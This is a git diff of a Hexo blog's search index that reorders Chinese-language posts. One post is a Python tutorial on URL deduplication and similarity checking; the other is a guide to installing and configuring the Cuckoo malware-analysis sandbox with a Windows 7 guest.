@@ -1,61 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>URL去重去似</title>
-    <url>/2018/05/24/url%E5%8E%BB%E9%87%8D%E5%8E%BB%E4%BC%BC/</url>
-    <content><![CDATA[<h2 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h2><p>URL去重主要有两种方式：</p>
-<ul>
-<li>布隆过滤器去重</li>
-<li><p>Hash表去重</p>
-<a id="more"></a>
-<h3 id="布隆过滤器去重"><a href="#布隆过滤器去重" class="headerlink" title="布隆过滤器去重"></a>布隆过滤器去重</h3><ol>
-<li>需要一个数组和k个映射函数，初始将数组array所有位置都置0。</li>
-<li>将元素集S={s1,s2……sn}中每个元素sj，通过k个映射函数{f1,f2……fk}映射为K个值{g1，g2……gk},将array中对应的array[g1],array[g2]……array[gk]置为1.</li>
-<li>若元素item通过映射函数得到的k个值在array中对应的值全为1，则item在S中，否则不在。</li>
-</ol>
-<p>python有两个第三方插件实现了此功能：</p>
-<ul>
-<li>Python-bloomfilter<br>项目地址:<a href="https://github.com/jaybaird/Python-bloomfilter">https://github.com/jaybaird/Python-bloomfilter</a></li>
-<li>Pybloomfiltermmap<br>项目地址:<a href="https://github.com/axiak/Pybloomfiltermmap">https://github.com/axiak/Pybloomfiltermmap</a><br>官方文档:<a href="https://axiak.github.io/pybloomfiltermmap/">https://axiak.github.io/pybloomfiltermmap/</a></li>
-</ul>
-<p>Pybloomfiltermmap模块实现两类布隆过滤器：Bloomfilter和ScalableBloomfilter。<br>Bloomfilter是一个定容过滤器，error_rate指最大误报率；<br>ScalableBloomfilter是一个不定容过滤器。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pybloomfilter <span class="keyword">import</span> BloomFilter</span><br><span class="line"><span class="comment"># 创建一个capacity等于100万，error rate等于0.001的bloomfilter对象</span></span><br><span class="line">bfilter = BloomFilter(<span class="number">1000000</span>,<span class="number">0.001</span>,<span class="string">&#x27;bf_test.bloom&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>方法add是添加元素，若元素已存在，则返回True，若不存在则返回False，并添加到过滤器中。</p>
-<p>布隆过滤器存在一定的误判率。</p>
-<h3 id="Hash表去重"><a href="#Hash表去重" class="headerlink" title="Hash表去重"></a>Hash表去重</h3><p>遍历URL列表，判断每个URL是否在去重后的列表里，如果不在，则加入列表。根据哈希表存放的位置，可以分为两种方式：一种是基于内存的Hash表去重；一种是基于硬盘的Hash表去重。</p>
-<h4 id="方法一：利用内存Hash表去重"><a href="#方法一：利用内存Hash表去重" class="headerlink" title="方法一：利用内存Hash表去重"></a>方法一：利用内存Hash表去重</h4><p>使用如下代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    result.append(url)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p>由于URL长度不固定，单个URL长度越长，使用URL存储内存和性能损耗过快，此时需对URL进行Hash运算压缩，如：16位md5运算。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 2.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(<span class="string">&quot;hello&quot;</span>).hexdigest()[<span class="number">8</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.md5(<span class="string">&quot;hello&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())[<span class="number">8</span>:<span class="number">-8</span>]</span><br></pre></td></tr></table></figure>
-<h4 id="方法二：利用BerkeleyDB去重"><a href="#方法二：利用BerkeleyDB去重" class="headerlink" title="方法二：利用BerkeleyDB去重"></a>方法二：利用BerkeleyDB去重</h4><p>BerkeleyDB是一个key-value database，简单的说，就是一个在disk上的hash表。存储的是“key-value”键值对。<br>下载安装Berkeley DB安装。Python需要安装bsddb3模块来提供BerkeleyDB数据库的操作接口。<br>Berkeley DB次你在四种数据访问模式：</p>
-<ul>
-<li>btree：树结构，存储任意复杂key和value</li>
-<li>hash：hash存储，访问量巨大时，效果好</li>
-<li>queue：队列操作，只能存储定长数据，key必须是数字</li>
-<li>recno：与queue相似，但支持边长value</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bsddb</span><br><span class="line">mydb = bsddb.db.DB()</span><br><span class="line">mydb.open(<span class="string">&#x27;mydb.db&#x27;</span>,dbtype = bsddb.db.DB_HASH, flags = bsddb.db.DB_CREATE)</span><br><span class="line">mydb.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>)</span><br><span class="line">mydb.close()</span><br></pre></td></tr></table></figure>
-<p>设置数据访问方法：<br>btree是 bsddb.db.DB_BTREE， hash是bsddb.db.DB_HASH<br>queu 是 bsddb.db.DB_QUEUE,  recno 是bsddb.db.DB_RECNO<br>设置flags参数为DB_CREATE表明如果数据文件不存在则新建一个空的数据文件。<br>使用DB的put方法存储一个Key/Value对</p>
-</li>
-</ul>
-<h2 id="URL去似去含"><a href="#URL去似去含" class="headerlink" title="URL去似去含"></a>URL去似去含</h2><p>相似URL特征：</p>
-<ul>
-<li>协议相同（protocol）</li>
-<li>主机名相同（host）</li>
-<li>端口相同（port）</li>
-<li>资源路劲相同（path）</li>
-<li>参数名所组成列表相同或包含</li>
-</ul>
-<p>python2.x使用urlparse，python3.x使用urllib，以python2.x为例：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line">url=<span class="string">&#x27;http://www.baidu.com:80/s?wd=python&amp;ie=utf-8#123&#x27;</span></span><br><span class="line">r=urlparse.urlparse(url)</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"><span class="keyword">print</span> r.netloc</span><br><span class="line"><span class="keyword">print</span> r.hostname</span><br><span class="line"><span class="keyword">print</span> r.port</span><br><span class="line"><span class="keyword">print</span> urlparse.parse_qs(r.query)</span><br><span class="line">res = urlparse.urlsplit(url)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><br>输出结果：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">www.baidu.com:80</span><br><span class="line">www.baidu.com</span><br><span class="line">80</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure><br>r = urlparse.urlparse(url)返回一个6个元组，分别为scheme, netloc, path, params, query, fragment，ParseResult类还有几个常用方法：<br>res.username<br>res.password<br>res.hostname<br>res.port<br>res.geturl()<br>urlunparse与之相反,将6个元组组成一个string。<br>urlsplit将path与params合并为path，存在urlunsplit与之相反功能。<br>使用urlparse.parse_qs()函数获取r.query中的参数列表，输出为字典。<br><strong>注释：url必须以<em><a href="http://xxx">http://xxx</a></em>开头,否则会出错。</strong></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python学习-argparse模块</title>
     <url>/2018/05/14/python%E5%AD%A6%E4%B9%A0-argparse%E6%A8%A1%E5%9D%97/</url>
     <content><![CDATA[<p>  argparse模块是python中用于解析命令行参数和选项的标准模块，方便用户在命令行中输入参数。</p>
@@ -124,49 +69,58 @@
       </tags>
   </entry>
   <entry>
-    <title>Cuckoo-Sandbox学习-安装篇</title>
-    <url>/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/</url>
-    <content><![CDATA[<p>Cuckoo Sandbox是一个开源的恶意文件自动化分析系统，通过Cuckoo Sandbox可以方便地帮助安全研究人员验证恶意程序的特征信息。</p>
-<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>本人在vmware中建立两个虚拟机，一个host，一个guest。<br>VMware 12 Pro<br>ubuntu-16.04.1-desktop-amd64<br>window7-64bit<br><a id="more"></a></p>
-<h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p>使用vmware安装ubuntu-16.04.1-desktop-amd64，添加2个网卡，一个NAT模式，一个内网网卡。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/网卡-ubuntu.PNG" alt></p>
-<p>依赖库<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev</span><br><span class="line">$ sudo apt-get install python-virtualenv python-setuptools</span><br><span class="line">$ sudo apt-get install libjpeg-dev zlib1g-dev swig</span><br></pre></td></tr></table></figure><br>为了使用基于Django的Web界面,使用PostgreSQL作为数据库，需要安装MongoDB和PostgreSQL。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install mongodb</span><br><span class="line">$ sudo apt-get install postgresql libpq-dev</span><br></pre></td></tr></table></figure><br>建议首先升级pip和setuptools库，因为它们经常过时，导致试图安装Cuckoo时出现问题</p>
-<h2 id><a href="#" class="headerlink" title></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U pip setuptools</span><br></pre></td></tr></table></figure></h2><p>若使用virtual box则创建一个cuckoo用户，将其添加到vboxusers组里<font color="red">（VirtualBox安装后创建）</font>。确保运行Cuckoo的用户与用于创建和运行虚拟机的用户相同（至少在VirtualBox的情况下），否则Cuckoo将无法识别和启动这些虚拟机。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo adduser cuckoo</span><br><span class="line">$ sudo usermod -a -G vboxusers cuckoo</span><br></pre></td></tr></table></figure><br>安装VirtualBox</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install virtualbox</span><br></pre></td></tr></table></figure></h2><h2 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h2><p>使用一条命令安装<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U cuckoo</span><br></pre></td></tr></table></figure><br>部分依赖需要翻墙，安装成功如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/install.PNG" alt></p>
-<p>如果在本地使用virtual box则切换cuckoo用户并运行，<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/run.PNG" alt></p>
-<p>从中可以看出配置文件路径为<em>/home/cuckoo/.cuckoo/conf</em>，工作目录路径可以修改，.cuckoo为隐藏目录，使用<code>ctrl+h</code>查看隐藏文件。</p>
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>几个主要的配置文件：</p>
+    <title>URL去重去似</title>
+    <url>/2018/05/24/url%E5%8E%BB%E9%87%8D%E5%8E%BB%E4%BC%BC/</url>
+    <content><![CDATA[<h2 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h2><p>URL去重主要有两种方式：</p>
 <ul>
-<li>cuckoo.conf：用于配置常规行为和分析选项。</li>
-<li>auxiliary.conf：用于启用和配置辅助模块。</li>
-<li>\<machinery>.conf：用于定义虚拟化软件的选项（该文件与您在cuckoo.conf中选择的机器模块名称相同,virtualbox.conf和vmware.conf）。</machinery></li>
-<li>memory.conf：波动配置。</li>
-<li>processing.conf：用于启用和配置处理模块。</li>
-<li>reporting.conf：用于启用或禁用报告格式。</li>
-</ul>
-<h2 id="客户机安装及配置"><a href="#客户机安装及配置" class="headerlink" title="客户机安装及配置"></a>客户机安装及配置</h2><p>使用vmware安装windows7 64bit，配置一个内网网卡。<br>查看ubuntu16.04.1的ip地址，配置window7客户机的ipv4地址的默认网关和DNS地址为ubuntu的ip地址，如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ip-windows7.PNG" alt></p>
-<p>安装python2.7.10，并关闭windows防火墙和自动更新，原因为他们可能影响恶意软件的行为。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/win7配置.PNG" alt></p>
-<p>为了正常运行，需要配置如下一些选项。</p>
+<li>布隆过滤器去重</li>
+<li><p>Hash表去重</p>
+<a id="more"></a>
+<h3 id="布隆过滤器去重"><a href="#布隆过滤器去重" class="headerlink" title="布隆过滤器去重"></a>布隆过滤器去重</h3><ol>
+<li>需要一个数组和k个映射函数，初始将数组array所有位置都置0。</li>
+<li>将元素集S={s1,s2……sn}中每个元素sj，通过k个映射函数{f1,f2……fk}映射为K个值{g1，g2……gk},将array中对应的array[g1],array[g2]……array[gk]置为1.</li>
+<li>若元素item通过映射函数得到的k个值在array中对应的值全为1，则item在S中，否则不在。</li>
+</ol>
+<p>python有两个第三方插件实现了此功能：</p>
 <ul>
-<li>启用自动登录</li>
-<li>启用远程RPC</li>
-<li>关闭分页（可选）</li>
-<li>禁用屏幕保护程序（可选）</li>
+<li>Python-bloomfilter<br>项目地址:<a href="https://github.com/jaybaird/Python-bloomfilter">https://github.com/jaybaird/Python-bloomfilter</a></li>
+<li>Pybloomfiltermmap<br>项目地址:<a href="https://github.com/axiak/Pybloomfiltermmap">https://github.com/axiak/Pybloomfiltermmap</a><br>官方文档:<a href="https://axiak.github.io/pybloomfiltermmap/">https://axiak.github.io/pybloomfiltermmap/</a></li>
 </ul>
-<p>在Windows 7中，以管理员权限打开管理命令提示符，输入以下命令以启用自动登录和远程RPC。<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\system\CurrentControlSet\Control\TerminalServer&quot; /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br></pre></td></tr></table></figure><br>前两条命令里的 \<USERNAME> 和 \<PASSWORD> 为自己的账户和密码。</PASSWORD></USERNAME></p>
-<p>找到之前安装的cuckoo路径下的agent/agent.py,并将其放到win7的启动目录下，<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>，把agent.py后缀改为agent.pyw，这样程序启动就不会有GUI窗口。</p>
-<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>很多恶意软件都需要访问网络才可以正常运行，因此需要配置windows主机上网，使用host主机开启流量转发、用 iptables 做地址转换（NAT）规则。</p>
-<p>临时开启ip转发功能方式，系统重启之后便失效：</p>
+<p>Pybloomfiltermmap模块实现两类布隆过滤器：Bloomfilter和ScalableBloomfilter。<br>Bloomfilter是一个定容过滤器，error_rate指最大误报率；<br>ScalableBloomfilter是一个不定容过滤器。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pybloomfilter <span class="keyword">import</span> BloomFilter</span><br><span class="line"><span class="comment"># 创建一个capacity等于100万，error rate等于0.001的bloomfilter对象</span></span><br><span class="line">bfilter = BloomFilter(<span class="number">1000000</span>,<span class="number">0.001</span>,<span class="string">&#x27;bf_test.bloom&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>方法add是添加元素，若元素已存在，则返回True，若不存在则返回False，并添加到过滤器中。</p>
+<p>布隆过滤器存在一定的误判率。</p>
+<h3 id="Hash表去重"><a href="#Hash表去重" class="headerlink" title="Hash表去重"></a>Hash表去重</h3><p>遍历URL列表，判断每个URL是否在去重后的列表里，如果不在，则加入列表。根据哈希表存放的位置，可以分为两种方式：一种是基于内存的Hash表去重；一种是基于硬盘的Hash表去重。</p>
+<h4 id="方法一：利用内存Hash表去重"><a href="#方法一：利用内存Hash表去重" class="headerlink" title="方法一：利用内存Hash表去重"></a>方法一：利用内存Hash表去重</h4><p>使用如下代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    result.append(url)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>由于URL长度不固定，单个URL长度越长，使用URL存储内存和性能损耗过快，此时需对URL进行Hash运算压缩，如：16位md5运算。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 2.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(<span class="string">&quot;hello&quot;</span>).hexdigest()[<span class="number">8</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.md5(<span class="string">&quot;hello&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())[<span class="number">8</span>:<span class="number">-8</span>]</span><br></pre></td></tr></table></figure>
+<h4 id="方法二：利用BerkeleyDB去重"><a href="#方法二：利用BerkeleyDB去重" class="headerlink" title="方法二：利用BerkeleyDB去重"></a>方法二：利用BerkeleyDB去重</h4><p>BerkeleyDB是一个key-value database，简单的说，就是一个在disk上的hash表。存储的是“key-value”键值对。<br>下载安装Berkeley DB安装。Python需要安装bsddb3模块来提供BerkeleyDB数据库的操作接口。<br>Berkeley DB次你在四种数据访问模式：</p>
 <ul>
-<li>sudo sysctl -w net.ipv4.ip_forward=1</li>
-<li>sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li>
+<li>btree：树结构，存储任意复杂key和value</li>
+<li>hash：hash存储，访问量巨大时，效果好</li>
+<li>queue：队列操作，只能存储定长数据，key必须是数字</li>
+<li>recno：与queue相似，但支持边长value</li>
 </ul>
-<p>若要重启后仍然有效，则需修改配置文件/etc/sysctl.conf，去掉net.ipv4.ip_forward=1 前的注释，之后执行如下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure><br>然后配置Iptables的规则:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0&#x2F;24 -m conntrack --ctstate NEW -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">sudo iptables -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line"></span><br><span class="line">sudo vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">编辑 Ubuntu 的网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces ，在文件末尾添加以下两行：</span><br><span class="line">pre-up iptables-restore &lt; &#x2F;etc&#x2F;iptables.rules #开机时启用 iptables 规则</span><br><span class="line">post-down iptables-save &gt; &#x2F;etc&#x2F;iptables.rules #关机前保存当前所有的 iptables 规则</span><br></pre></td></tr></table></figure><br>效果如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ping.PNG" alt></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bsddb</span><br><span class="line">mydb = bsddb.db.DB()</span><br><span class="line">mydb.open(<span class="string">&#x27;mydb.db&#x27;</span>,dbtype = bsddb.db.DB_HASH, flags = bsddb.db.DB_CREATE)</span><br><span class="line">mydb.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>)</span><br><span class="line">mydb.close()</span><br></pre></td></tr></table></figure>
+<p>设置数据访问方法：<br>btree是 bsddb.db.DB_BTREE， hash是bsddb.db.DB_HASH<br>queu 是 bsddb.db.DB_QUEUE,  recno 是bsddb.db.DB_RECNO<br>设置flags参数为DB_CREATE表明如果数据文件不存在则新建一个空的数据文件。<br>使用DB的put方法存储一个Key/Value对</p>
+</li>
+</ul>
+<h2 id="URL去似去含"><a href="#URL去似去含" class="headerlink" title="URL去似去含"></a>URL去似去含</h2><p>相似URL特征：</p>
+<ul>
+<li>协议相同（protocol）</li>
+<li>主机名相同（host）</li>
+<li>端口相同（port）</li>
+<li>资源路劲相同（path）</li>
+<li>参数名所组成列表相同或包含</li>
+</ul>
+<p>python2.x使用urlparse，python3.x使用urllib，以python2.x为例：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line">url=<span class="string">&#x27;http://www.baidu.com:80/s?wd=python&amp;ie=utf-8#123&#x27;</span></span><br><span class="line">r=urlparse.urlparse(url)</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"><span class="keyword">print</span> r.netloc</span><br><span class="line"><span class="keyword">print</span> r.hostname</span><br><span class="line"><span class="keyword">print</span> r.port</span><br><span class="line"><span class="keyword">print</span> urlparse.parse_qs(r.query)</span><br><span class="line">res = urlparse.urlsplit(url)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><br>输出结果：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">www.baidu.com:80</span><br><span class="line">www.baidu.com</span><br><span class="line">80</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com:80&#x27;</span>, path=<span class="string">&#x27;/s&#x27;</span>, query=<span class="string">&#x27;wd=python&amp;ie=utf-8&#x27;</span>, fragment=<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure><br>r = urlparse.urlparse(url)返回一个6个元组，分别为scheme, netloc, path, params, query, fragment，ParseResult类还有几个常用方法：<br>res.username<br>res.password<br>res.hostname<br>res.port<br>res.geturl()<br>urlunparse与之相反,将6个元组组成一个string。<br>urlsplit将path与params合并为path，存在urlunsplit与之相反功能。<br>使用urlparse.parse_qs()函数获取r.query中的参数列表，输出为字典。<br><strong>注释：url必须以<em><a href="http://xxx">http://xxx</a></em>开头,否则会出错。</strong></p>
 ]]></content>
       <categories>
-        <category>工具使用</category>
+        <category>python</category>
       </categories>
       <tags>
-        <tag>Cickoo Sandbox</tag>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -306,6 +260,52 @@
       <tags>
         <tag>逆向</tag>
         <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cuckoo-Sandbox学习-安装篇</title>
+    <url>/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/</url>
+    <content><![CDATA[<p>Cuckoo Sandbox是一个开源的恶意文件自动化分析系统，通过Cuckoo Sandbox可以方便地帮助安全研究人员验证恶意程序的特征信息。</p>
+<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>本人在vmware中建立两个虚拟机，一个host，一个guest。<br>VMware 12 Pro<br>ubuntu-16.04.1-desktop-amd64<br>window7-64bit<br><a id="more"></a></p>
+<h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p>使用vmware安装ubuntu-16.04.1-desktop-amd64，添加2个网卡，一个NAT模式，一个内网网卡。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/网卡-ubuntu.PNG" alt></p>
+<p>依赖库<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev</span><br><span class="line">$ sudo apt-get install python-virtualenv python-setuptools</span><br><span class="line">$ sudo apt-get install libjpeg-dev zlib1g-dev swig</span><br></pre></td></tr></table></figure><br>为了使用基于Django的Web界面,使用PostgreSQL作为数据库，需要安装MongoDB和PostgreSQL。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install mongodb</span><br><span class="line">$ sudo apt-get install postgresql libpq-dev</span><br></pre></td></tr></table></figure><br>建议首先升级pip和setuptools库，因为它们经常过时，导致试图安装Cuckoo时出现问题</p>
+<h2 id><a href="#" class="headerlink" title></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U pip setuptools</span><br></pre></td></tr></table></figure></h2><p>若使用virtual box则创建一个cuckoo用户，将其添加到vboxusers组里<font color="red">（VirtualBox安装后创建）</font>。确保运行Cuckoo的用户与用于创建和运行虚拟机的用户相同（至少在VirtualBox的情况下），否则Cuckoo将无法识别和启动这些虚拟机。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo adduser cuckoo</span><br><span class="line">$ sudo usermod -a -G vboxusers cuckoo</span><br></pre></td></tr></table></figure><br>安装VirtualBox</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install virtualbox</span><br></pre></td></tr></table></figure></h2><h2 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h2><p>使用一条命令安装<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U cuckoo</span><br></pre></td></tr></table></figure><br>部分依赖需要翻墙，安装成功如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/install.PNG" alt></p>
+<p>如果在本地使用virtual box则切换cuckoo用户并运行，<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/run.PNG" alt></p>
+<p>从中可以看出配置文件路径为<em>/home/cuckoo/.cuckoo/conf</em>，工作目录路径可以修改，.cuckoo为隐藏目录，使用<code>ctrl+h</code>查看隐藏文件。</p>
+<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>几个主要的配置文件：</p>
+<ul>
+<li>cuckoo.conf：用于配置常规行为和分析选项。</li>
+<li>auxiliary.conf：用于启用和配置辅助模块。</li>
+<li>\<machinery>.conf：用于定义虚拟化软件的选项（该文件与您在cuckoo.conf中选择的机器模块名称相同,virtualbox.conf和vmware.conf）。</machinery></li>
+<li>memory.conf：波动配置。</li>
+<li>processing.conf：用于启用和配置处理模块。</li>
+<li>reporting.conf：用于启用或禁用报告格式。</li>
+</ul>
+<h2 id="客户机安装及配置"><a href="#客户机安装及配置" class="headerlink" title="客户机安装及配置"></a>客户机安装及配置</h2><p>使用vmware安装windows7 64bit，配置一个内网网卡。<br>查看ubuntu16.04.1的ip地址，配置window7客户机的ipv4地址的默认网关和DNS地址为ubuntu的ip地址，如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ip-windows7.PNG" alt></p>
+<p>安装python2.7.10，并关闭windows防火墙和自动更新，原因为他们可能影响恶意软件的行为。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/win7配置.PNG" alt></p>
+<p>为了正常运行，需要配置如下一些选项。</p>
+<ul>
+<li>启用自动登录</li>
+<li>启用远程RPC</li>
+<li>关闭分页（可选）</li>
+<li>禁用屏幕保护程序（可选）</li>
+</ul>
